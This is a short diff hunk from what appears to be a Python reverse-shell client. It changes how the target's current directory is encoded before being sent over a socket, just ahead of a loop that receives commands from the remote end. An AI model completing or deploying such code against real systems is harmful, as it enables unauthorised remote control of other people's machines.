@@ -15,7 +15,7 @@ def target():
 
     # get current directory
     cwd = os.getcwd()
-    s.send(cwd.encode())
+    s.send(cwd.encode("utf-8"))
 
     while True:
         command = s.recv(BUFFER_SIZE).decode("utf-8")
